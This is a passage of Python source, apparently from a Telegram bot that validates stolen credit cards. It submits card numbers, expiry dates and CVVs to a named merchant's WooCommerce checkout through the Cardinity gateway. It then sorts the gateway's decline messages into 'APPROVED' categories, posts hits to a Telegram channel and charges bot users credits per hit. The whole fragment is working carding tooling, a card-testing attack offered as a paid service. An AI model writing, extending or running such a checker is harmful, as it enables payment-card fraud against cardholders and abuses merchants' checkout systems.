unvalidated_fields=&payment_method=cardinity&cardinity-card-holder=Andres+Bermudez&cardinity-card-number={ccnum}&cardinity-card-expiry={mes}+%2F+{ano}&cardinity-card-cvc={cvv}&cardinity_screen_width=1920&cardinity_screen_height=1080&cardinity_browser_language=en-US&cardinity_color_depth=24&cardinity_time_zone=-60&card_token={card_token}&cr_customer_consent_field=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce={checkout_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
    
    for retry in range(max_retries):
        try:
            response = session.post('https://amediasocial.com/', params=params, headers=headers, data=data).text
    
            code = parseX(response, '"message-icon icon-close\\"><\/span>\\n\\t\\t\\t\\t', '\\t\\t\\t<\/div>')
   
            break
        
            
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #4"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #4")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #4"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #4")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #4"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    #------------------- RESPONSE CODE ------------------------#
    
    if "Payment declined: 33333: 3D Secure Authorization Failed." in code:
        msg = "APPROVED 3D✅"
        respuesta = code
        
    elif int(response.find('"result":"success"')) > 0 :
        msg = "APPROVED ✅"
        respuesta = "Charge $20"
        
    elif "Payment declined: 3014: SCA Required" in code:
        msg = "APPROVED 3D✅"
        respuesta = code
        
    elif "Payment declined: 3013: Invalid CVV" in code:
        msg = "APPROVED CCN✅"
        respuesta = code
        
    elif "Payment declined: 3001: Insufficient funds" in code:
        msg = "APPROVED CVV✅"
        respuesta = code
 
    else:
        msg = "DECLINED ❌"
        respuesta = code
        
    
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    
    if "APPROVED" in msg:
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
        
        current_credits = int(user_data[1])

        # Restar 2 crédito
        new_credits = current_credits - 2

        # Actualizar créditos en la tabla users
        update_query = "UPDATE users SET creditos = ? WHERE user_id = ?"
        update_data = (new_credits, user_id)
        cursor.execute(update_query, update_data)
        conn.commit()
        
        # Obtener créditos actuales del usuario
        select_query = "SELECT creditos FROM users WHERE user_id = ?"
        cursor.execute(select_query, (user_id,))
        current_credits = cursor.fetchone()[0]
        
        return message.reply(f"<b>2 Credits have been deducted, Remaining: {current_credits} </b>")
        
    
